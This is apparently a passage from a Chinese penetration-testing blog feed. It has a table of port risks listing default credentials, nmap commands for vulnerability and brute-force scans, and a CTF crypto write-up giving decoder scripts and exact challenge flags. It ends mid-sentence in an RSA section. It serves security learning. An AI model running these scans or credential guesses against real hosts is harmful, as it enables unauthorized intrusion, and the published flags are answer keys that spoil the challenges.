      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> 指纹 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常规信息收集之端口</title>
      <link href="/2020/09/29/chang-gui-xin-xi-shou-ji-zhi-duan-kou/"/>
      <url>/2020/09/29/chang-gui-xin-xi-shou-ji-zhi-duan-kou/</url>
      
        <content type="html"><![CDATA[<h1 id="常用端口安全风险"><a href="#常用端口安全风险" class="headerlink" title="常用端口安全风险"></a>常用端口安全风险</h1><table><thead><tr><th align="center">端口</th><th align="center">类型</th><th align="center">服务</th><th align="center">威胁</th></tr></thead><tbody><tr><td align="center">20</td><td align="center">TCP</td><td align="center">FTP数据连接</td><td align="center"></td></tr><tr><td align="center">21</td><td align="center">TCP</td><td align="center">FTP控制连接</td><td align="center">弱口令，匿名登录</td></tr><tr><td align="center">22</td><td align="center">TCP/UDP</td><td align="center">SSH</td><td align="center">shell连接</td></tr><tr><td align="center">23</td><td align="center">TCP</td><td align="center">Telnet</td><td align="center"></td></tr><tr><td align="center">25</td><td align="center">TCP</td><td align="center">SMTP</td><td align="center"></td></tr><tr><td align="center">42</td><td align="center">TCP/UDP</td><td align="center">WINS Windows网络名称服务</td><td align="center"></td></tr><tr><td align="center">53</td><td align="center">TCP/UDP</td><td align="center">DNS</td><td align="center"></td></tr><tr><td align="center">67</td><td align="center">UDP</td><td align="center">DHCP服务</td><td align="center"></td></tr><tr><td align="center">68</td><td align="center">UDP</td><td align="center">DHCP客户端</td><td align="center"></td></tr><tr><td align="center">69</td><td align="center">UDP</td><td align="center">TFTP</td><td align="center"></td></tr><tr><td align="center">80</td><td align="center">TCP/UDP</td><td align="center">Web</td><td align="center"></td></tr><tr><td align="center">80-89</td><td align="center">TCP/UDP</td><td align="center">Web</td><td align="center"></td></tr><tr><td align="center">110</td><td align="center">TCP</td><td align="center">POP3</td><td align="center"></td></tr><tr><td align="center">119</td><td align="center">TCP</td><td align="center">NNTP</td><td align="center"></td></tr><tr><td align="center">123</td><td align="center">TCP/UDP</td><td align="center">NTP</td><td align="center"></td></tr><tr><td align="center">135</td><td align="center">TCP/UDP</td><td align="center">Microsoft RPC</td><td align="center"></td></tr><tr><td align="center">137</td><td align="center">TCP/UDP</td><td align="center">NetBIOS名称服务协议</td><td align="center"></td></tr><tr><td align="center">138</td><td align="center">TCP/UDP</td><td align="center">NetBIOS数据流服务</td><td align="center"></td></tr><tr><td align="center">139</td><td align="center">TCP/UDP</td><td align="center">NetBIOS绘画服务</td><td align="center"></td></tr><tr><td align="center">143</td><td align="center">TCP/UDP</td><td align="center">IMAP Internet邮件访问协议</td><td align="center"></td></tr><tr><td align="center">161</td><td align="center">TCP/UDP</td><td align="center">SNMP</td><td align="center"></td></tr><tr><td align="center">162</td><td align="center">TCP/UDP</td><td align="center">SNMP陷阱</td><td align="center"></td></tr><tr><td align="center">389</td><td align="center">TCP/UDP</td><td align="center">LDAP 轻量目录访问协议</td><td align="center"></td></tr><tr><td align="center">443</td><td align="center">TCP/UDP</td><td align="center">HTTPS HTTP的安全版本</td><td align="center">SSL心脏滴血</td></tr><tr><td align="center">445</td><td align="center">TCP</td><td align="center">SMB</td><td align="center"></td></tr><tr><td align="center">512,513,514</td><td align="center"></td><td align="center">Rexec</td><td align="center"></td></tr><tr><td align="center">636</td><td align="center">TCP/UDP</td><td align="center">LDAPS</td><td align="center"></td></tr><tr><td align="center">873</td><td align="center">TCP</td><td align="center">rsync远程文件同步协议</td><td align="center">Rsync未授权</td></tr><tr><td align="center">993</td><td align="center">TCP</td><td align="center">IMAPS</td><td align="center"></td></tr><tr><td align="center">995</td><td align="center">TCP</td><td align="center">POP3S</td><td align="center"></td></tr><tr><td align="center">1025,111</td><td align="center"></td><td align="center">NFS</td><td align="center">弱口令</td></tr><tr><td align="center">1433</td><td align="center">TCP</td><td align="center">MSSQL</td><td align="center">弱口令</td></tr><tr><td align="center">1521</td><td align="center"></td><td align="center">Oracle:(iSqlPlus Port:5560,7778)</td><td align="center"></td></tr><tr><td align="center">2601,2604</td><td align="center"></td><td align="center">zebra路由</td><td align="center">默认密码zebra</td></tr><tr><td align="center">3306</td><td align="center">TCP</td><td align="center">MySQL</td><td align="center">弱口令</td></tr><tr><td align="center">3312/3311</td><td align="center"></td><td align="center">kangle主机管理系统登录</td><td align="center"></td></tr><tr><td align="center">3389</td><td align="center">TCP</td><td align="center">RDP 远程桌面</td><td align="center">弱口令</td></tr><tr><td align="center">4440</td><td align="center"></td><td align="center">rundeck</td><td align="center"></td></tr><tr><td align="center">5432</td><td align="center"></td><td align="center">PostgreSQL</td><td align="center"></td></tr><tr><td align="center">5800</td><td align="center">TCP</td><td align="center">VNC（Web界面）</td><td align="center"></td></tr><tr><td align="center">5900</td><td align="center">TCP</td><td align="center">VNC（远程桌面）</td><td align="center"></td></tr><tr><td align="center">5984</td><td align="center"></td><td align="center">CouchDB</td><td align="center"><code>http://xxx:5984/_utils</code></td></tr><tr><td align="center">6082</td><td align="center"></td><td align="center">varnish</td><td align="center"></td></tr><tr><td align="center">6379</td><td align="center"></td><td align="center">redis未授权</td><td align="center"></td></tr><tr><td align="center">7001,7002</td><td align="center"></td><td align="center">WebLogic</td><td align="center">弱口令，反序列化</td></tr><tr><td align="center">7778</td><td align="center"></td><td align="center">Kloxo主机控制面板登录</td><td align="center"></td></tr><tr><td align="center">8000-9090</td><td align="center"></td><td align="center">Web端口</td><td align="center"></td></tr><tr><td align="center">8080</td><td align="center"></td><td align="center">tomcat/WDCP主机管理系统</td><td align="center">默认弱口令</td></tr><tr><td align="center">8080,8089,9090</td><td align="center"></td><td align="center">JBOSS</td><td align="center"></td></tr><tr><td align="center">8161</td><td align="center"></td><td align="center">activemq</td><td align="center">默认用户名密码：admin</td></tr><tr><td align="center">8888</td><td align="center"></td><td align="center">amh/LuManager</td><td align="center">主机管理系统默认端口</td></tr><tr><td align="center">9200,9300</td><td align="center"></td><td align="center">elasticsearch</td><td align="center"></td></tr><tr><td align="center">10000</td><td align="center"></td><td align="center">Virtualmin/Webmin服务器虚拟主机管理系统</td><td align="center"></td></tr><tr><td align="center">11211</td><td align="center"></td><td align="center">memcache</td><td align="center">未授权访问</td></tr><tr><td align="center">27017,27018</td><td align="center"></td><td align="center">Mongodb</td><td align="center">未授权访问</td></tr><tr><td align="center">28017</td><td align="center"></td><td align="center">mongodb统计页面</td><td align="center"></td></tr><tr><td align="center">50000</td><td align="center"></td><td align="center">SAP命令执行</td><td align="center"></td></tr><tr><td align="center">50070,50030</td><td align="center"></td><td align="center">hadoop</td><td align="center">未授权访问</td></tr></tbody></table><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><h2 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h2><p>Download Link:<a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="noopener">masscan</a></p><p>描述：</p><ul><li>它可以在6分钟内扫描整个互联网，从一台机器每秒传输1000万个数据包。</li><li>masscan使用自己的自定义TCP/IP堆栈</li><li>除简单端口扫描之外的任何其他操作都可能导致于本地TCP/IP堆栈冲突。</li></ul><p>缺点：</p><ul><li>很吃带宽</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Port/msscan扫描结果.png" alt="msscan扫描结果"></center><h2 id="scanport"><a href="#scanport" class="headerlink" title="scanport"></a>scanport</h2><p>描述：</p><ul><li>小巧的Windows端口快速扫描工具最大线程为200</li></ul><h2 id="御剑"><a href="#御剑" class="headerlink" title="御剑"></a>御剑</h2><p>描述：</p><ul><li>基于VB.NET+IOCP模型开发的高效端口扫描工具</li><li>支持IP区间合并，端口区间合并</li><li>端口指纹深度探测</li></ul><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>描述：</p><ul><li>系统漏洞检测：<code>nmap --script smb-check-vulns.nse -p 192.168.1.1</code></li><li>数据库密码检测：<code>nmap --script=brute 192.168.1.1</code></li><li>收集应用服务器信息：<code>nmap -sC 192.168.1.1</code></li><li>检测常见漏洞：<code>nmap --script=vuln 192.168.1.1</code></li><li>检测部分应用的弱口令(负责处理鉴权证书)：<code>nmap --script=auth 192.168.1.1</code></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Port/nmap扫描应用服务器信息.png" alt="nmap扫描应用服务器信息"></center>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> 端口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界新手区CRYPTO-writeup</title>
      <link href="/2020/09/29/gong-fang-shi-jie-xin-shou-qu-crypto-writeup/"/>
      <url>/2020/09/29/gong-fang-shi-jie-xin-shou-qu-crypto-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="001-base64"><a href="#001-base64" class="headerlink" title="001 base64"></a>001 base64</h1><p><strong>0x01 题目描述</strong></p><p>​        元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。 你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。</p><p><strong>0x02 解题思路</strong></p><ul><li>base64基础解密</li></ul><p><strong>0x03 解题工具</strong></p><ul><li>加密解密小玩具</li></ul><p><strong>0x04 解题步骤</strong></p><ol><li><p>下载题目附件并讲文件中的密文复制到工具中进行解密操作。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/base64_decrypto_flag.png"></li><li><p>得到Flag：<code>cyberpeace{Welcome_to_new_World!}</code></p></li></ol><p><strong>0x05 考察知识</strong></p><ul><li>base64</li></ul><h1 id="002-Caesar"><a href="#002-Caesar" class="headerlink" title="002 Caesar"></a>002 Caesar</h1><p><strong>0x01 题目描述</strong></p><p>​        你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看 大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了</p><p><strong>0x02 解题思路</strong></p><ul><li>Caesar</li></ul><p><strong>0x03 解题工具</strong></p><ul><li>CTFCreakTools</li></ul><p><strong>0x04 解题步骤</strong></p><ol><li><p>下载题目附件并将密文复制到CTFCreakTools中尝试Ceasar解密。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/ceasar_decrypto_flag.png"></li><li><p>Flag：<code>cyberpeace{you_have_learned_caesar_encryption}</code></p></li></ol><p><strong>0x05 考察知识</strong></p><ul><li>Ceasar</li></ul><h1 id="003-Morse"><a href="#003-Morse" class="headerlink" title="003 Morse"></a>003 Morse</h1><p><strong>0x01 题目描述</strong></p><p>​        小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来 这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”<code>(flag格式为cyberpeace{xxxxxxxxxx},均为小写)</code></p><p><strong>0x02 解题思路</strong></p><ul><li>莫斯密码</li></ul><p><strong>0x03 解题工具</strong></p><ul><li>python</li><li>CTFCreakTools</li></ul><p><strong>0x04 解题步骤</strong></p><ol><li><p>下载题目附件，打开文件，<font color="red">1变为<code>-</code>,0变为<code>.</code></font>，使用python编写的POC进行解密。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/morse_decrypto_flag.png"></li><li><p>得到Flag：<code>cyberpeace{morsecodeissointeresting}</code></p></li></ol><p><strong>0x05 考察知识</strong></p><ul><li>Morse</li></ul><p><strong>0x06 POC</strong></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span>CODE_TABLE <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true"># 26 个英文字符</span>    <span class="token string">'A'</span><span class="token punctuation">:</span> <span class="token string">'.-'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">:</span> <span class="token string">'-...'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">:</span> <span class="token string">'-.-.'</span><span class="token punctuation">,</span>    <span class="token string">'D'</span><span class="token punctuation">:</span> <span class="token string">'-..'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">:</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">:</span> <span class="token string">'..-.'</span><span class="token punctuation">,</span>    <span class="token string">'G'</span><span class="token punctuation">:</span> <span class="token string">'--.'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">:</span> <span class="token string">'....'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">:</span> <span class="token string">'..'</span><span class="token punctuation">,</span>    <span class="token string">'J'</span><span class="token punctuation">:</span> <span class="token string">'.---'</span><span class="token punctuation">,</span> <span class="token string">'K'</span><span class="token punctuation">:</span> <span class="token string">'-.-'</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">:</span> <span class="token string">'.-..'</span><span class="token punctuation">,</span>    <span class="token string">'M'</span><span class="token punctuation">:</span> <span class="token string">'--'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">:</span> <span class="token string">'-.'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">:</span> <span class="token string">'---'</span><span class="token punctuation">,</span>    <span class="token string">'P'</span><span class="token punctuation">:</span> <span class="token string">'.--.'</span><span class="token punctuation">,</span> <span class="token string">'Q'</span><span class="token punctuation">:</span> <span class="token string">'--.-'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">:</span> <span class="token string">'.-.'</span><span class="token punctuation">,</span>    <span class="token string">'S'</span><span class="token punctuation">:</span> <span class="token string">'...'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">:</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'U'</span><span class="token punctuation">:</span> <span class="token string">'..-'</span><span class="token punctuation">,</span>    <span class="token string">'V'</span><span class="token punctuation">:</span> <span class="token string">'...-'</span><span class="token punctuation">,</span> <span class="token string">'W'</span><span class="token punctuation">:</span> <span class="token string">'.--'</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">:</span> <span class="token string">'-..-'</span><span class="token punctuation">,</span>    <span class="token string">'Y'</span><span class="token punctuation">:</span> <span class="token string">'-.--'</span><span class="token punctuation">,</span> <span class="token string">'Z'</span><span class="token punctuation">:</span> <span class="token string">'--..'</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true"># 10 个数字</span>    <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'-----'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'.----'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">'..---'</span><span class="token punctuation">,</span>    <span class="token string">'3'</span><span class="token punctuation">:</span> <span class="token string">'...--'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token string">'....-'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">:</span> <span class="token string">'.....'</span><span class="token punctuation">,</span>    <span class="token string">'6'</span><span class="token punctuation">:</span> <span class="token string">'-....'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token string">'--...'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">:</span> <span class="token string">'---..'</span><span class="token punctuation">,</span>    <span class="token string">'9'</span><span class="token punctuation">:</span> <span class="token string">'----.'</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true"># 16 个特殊字符</span>    <span class="token string">','</span><span class="token punctuation">:</span> <span class="token string">'--..--'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">:</span> <span class="token string">'.-.-.-'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">:</span> <span class="token string">'---...'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">:</span> <span class="token string">'-.-.-.'</span><span class="token punctuation">,</span>    <span class="token string">'?'</span><span class="token punctuation">:</span> <span class="token string">'..--..'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">:</span> <span class="token string">'-...-'</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">:</span> <span class="token string">'.----.'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">:</span> <span class="token string">'-..-.'</span><span class="token punctuation">,</span>    <span class="token string">'!'</span><span class="token punctuation">:</span> <span class="token string">'-.-.--'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">:</span> <span class="token string">'-....-'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">:</span> <span class="token string">'..--.-'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">:</span> <span class="token string">'-.--.'</span><span class="token punctuation">,</span>    <span class="token string">')'</span><span class="token punctuation">:</span> <span class="token string">'-.--.-'</span><span class="token punctuation">,</span> <span class="token string">'$'</span><span class="token punctuation">:</span> <span class="token string">'...-..-'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">:</span> <span class="token string">'. . . .'</span><span class="token punctuation">,</span> <span class="token string">'@'</span><span class="token punctuation">:</span> <span class="token string">'.--.-.'</span>    <span class="token comment" spellcheck="true"># 你还可以自定义</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">morsedecode</span><span class="token punctuation">(</span>morse<span class="token punctuation">)</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span><span class="token string">''</span>    codes <span class="token operator">=</span> morse<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> code <span class="token keyword">in</span> codes<span class="token punctuation">:</span>        <span class="token keyword">if</span> code <span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">:</span>            msg <span class="token operator">+=</span> <span class="token string">' '</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            UNCODE <span class="token operator">=</span>dict<span class="token punctuation">(</span>map<span class="token punctuation">(</span><span class="token keyword">lambda</span> t<span class="token punctuation">:</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>CODE_TABLE<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            msg <span class="token operator">+=</span> UNCODE<span class="token punctuation">[</span>code<span class="token punctuation">]</span>    <span class="token keyword">return</span> msga <span class="token operator">=</span> open<span class="token punctuation">(</span>r<span class="token string">'morse.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>ciphertext <span class="token operator">=</span> a<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>ciphertext <span class="token operator">=</span> ciphertext<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">)</span>ciphertext <span class="token operator">=</span> ciphertext<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">)</span>FLAG <span class="token operator">=</span> morsedecode<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>flag <span class="token operator">=</span> FLAG<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">'cyberpeace{'</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token string">'}'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag is '</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span></code></pre><h1 id="004-不仅仅是Morse"><a href="#004-不仅仅是Morse" class="headerlink" title="004 不仅仅是Morse"></a>004 不仅仅是Morse</h1><p><strong>0x01 题目描述</strong></p><p>​        “这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人 安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案}</p><p><strong>0x02 解题思路</strong></p><ul><li>莫斯密码</li><li>培根密码</li></ul><p><strong>0x03 解题工具</strong></p><ul><li>CTFCreakTools</li></ul><p><strong>0x04 解题步骤</strong></p><ol><li><p>下载题目附件，打开文本文件，发现为莫斯密码，简单修改格式后使用CTFCreakTools进行莫斯解密。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/onlymorse_morse_decrypto.png"></li><li><p>莫斯解密后的结果仍不是flag，发现还有一层培根加密，使用<code>Bugku|培根密码加解密</code>进行培根解密。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/onlymorse_baconian_decrypto.png"></li><li><p>得到Flag：<code>cyberpeace{attackanddefenceworldisinteresting}</code></p></li></ol><p><strong>0x05 考察知识</strong></p><ul><li>莫斯密码</li><li>培根密码</li></ul><h1 id="005-混合编码"><a href="#005-混合编码" class="headerlink" title="005 混合编码"></a>005 混合编码</h1><p><strong>0x01 题目描述</strong></p><p>​        经过了前面那么多题目的历练，耐心细致在解题当中是 必不可少的品质，刚巧你们都有，你和小鱼越来越入迷。那么走向了下一个题目，这个题目好长 好长，你知道你们只要细心细致，答案总会被你们做出来的，你们开始慢慢的尝试，慢慢的猜想 ，功夫不负有心人，在你们耐心的一步步的解答下，答案跃然纸上，你俩默契一笑，相视击掌 走向了下面的挑战。格式为cyberpeace{小写的你解出的答案}</p><p><strong>0x02 解题思路</strong></p><ul><li>base64加密</li><li>HTML加密</li><li>ASCII</li></ul><p><strong>0x03 解题工具</strong></p><ul><li>CaptfEncoder</li></ul><p><strong>0x04 解题步骤</strong></p><ol><li><p>首先，将密文放到CaptfEncoder中进行Base64解密。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/complex_encode_base64_decrypto_1.png"></li><li><p>然后，将密文放到CaptfEncoder中进行HTMLEntity解密。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/complex_encode_htmlEntity_decrypto.png"></li><li><p>接着，将密文放到CaptfEncoder中进行Base64解密。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/complex_encode_base64_decrypto_2.png"></li><li><p>最后，将编码放到CaptfEncoder中进行ASCII转码。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/complex_encode_ascii.png"></li><li><p>得到Flag：<code>cyberpeace{welcometoattackanddefenceworld}</code></p></li></ol><p><strong>0x05 考察知识</strong></p><ul><li>base64</li><li>htmlEntity</li><li>ASCII</li></ul><h1 id="006-幂数加密"><a href="#006-幂数加密" class="headerlink" title="006 幂数加密"></a>006 幂数加密</h1><p><strong>0x01 题目描述</strong></p><p>​        你和小鱼终于走到了最后的一个谜题所在的地方，上面写着一段话“亲爱的朋友， 很开心你对网络安全有这么大的兴趣，希望你一直坚持下去，不要放弃 ，学到一些知识，  走进广阔的安全大世界”，你和小鱼接过谜题，开始了耐心细致的解答。flag为cyberpeace{你解答出的八位大写字母}</p><p>附件内容：</p><pre class=" language-php"><code class="language-php"><span class="token number">8842101220480224404014224202480122</span></code></pre><p><strong>0x02 解题思路</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/云影密码.png" alt="云影密码"></center><p><strong>0x03 解题工具</strong></p><ul><li>python3</li></ul><p><strong>0x04 解题步骤</strong></p><ul><li>自编写payload</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/user/bin/env python</span><span class="token comment" spellcheck="true"># -*-coding:utf-8 -*-</span>a <span class="token operator">=</span> open<span class="token punctuation">(</span>r<span class="token string">'crypto11.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>ciphertext <span class="token operator">=</span> a<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> ciphertext<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>        list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>j<span class="token punctuation">)</span>    b <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> list<span class="token punctuation">:</span>        b <span class="token operator">+=</span> int<span class="token punctuation">(</span>k<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 字母ascii值与字母顺序相差为96</span>    flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token number">96</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag is '</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span></code></pre><ul><li>执行后得到flag：<code>cyberpeace{WELLDONE}</code></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/幂数加密-flag.png" alt="幂数加密-flag"></center><p><strong>0x05 考察知识</strong></p><ul><li>云影密码</li></ul><h1 id="007-Railfence"><a href="#007-Railfence" class="headerlink" title="007 Railfence"></a>007 Railfence</h1><p><strong>0x01 题目描述</strong></p><p>​        被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的 图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。</p><p><strong>0x02 解题思路</strong></p><ul><li>栅栏密码</li><li>key=5</li></ul><p><strong>0x03 解题工具</strong></p><ul><li><a href="http://www.atoolbox.net/Tool.php?Id=777" target="_blank" rel="noopener">在线工具-栅栏密码</a></li></ul><p><strong>0x04 解题步骤</strong></p><ul><li><p>复制密文到在线解密网页中，并设置key=5，解密得到Flag。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/crypto-Railfence-flag.png"></li><li><p>得到Flag：<code>cyberpeace{railfence_cipher_gogogo}</code></p></li></ul><p><strong>0x05 考察知识</strong></p><ul><li>栅栏密码</li></ul><h1 id="008-easy-RSA"><a href="#008-easy-RSA" class="headerlink" title="008 easy_RSA"></a>008 easy_RSA</h1><p><strong>0x01 题目描述</strong></p><p>​        解答出来了上一个题目的你现在可是春风得意，你们走向了下一个题目所处的地方 你一看这个题目傻眼了，这明明是一个数学题啊！！！可是你的数学并不好。扭头看向小鱼，小鱼哈哈一笑  ，让你在学校里面不好好听讲现在傻眼了吧~来我来！三下五除二，小鱼便把这个题目轻轻松松的搞定了。flag格式为cyberpeace{小写的你解出的答案}</p><p>附件内容：</p><p>​        在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17，求解出d</p><p><strong>0x02 解题思路</strong></p><ul><li>RSA的算法涉及三个参数，n、e、d。<br>其中，n是两个大质数p、q的积，n的二进制表示所占用的位数，就是所谓的密钥长度。<br>e和d是一对相关的值，e可以任意取，但要求e与<code>(p-1)*(q-1)</code>互质；再选择d，要求<code>(d*e)mod((p-1)*(q-1))=1</code>。<br><code>（n，e),(n，d)</code>就是密钥对。其中<code>(n，e)</code>为公钥，<code>(n，d)</code>为私钥。<br>RSA加解密的算法完全相同，设A为明文，B为密文，则：<code>A=B^d mod n</code>；<code>B=A^e mod 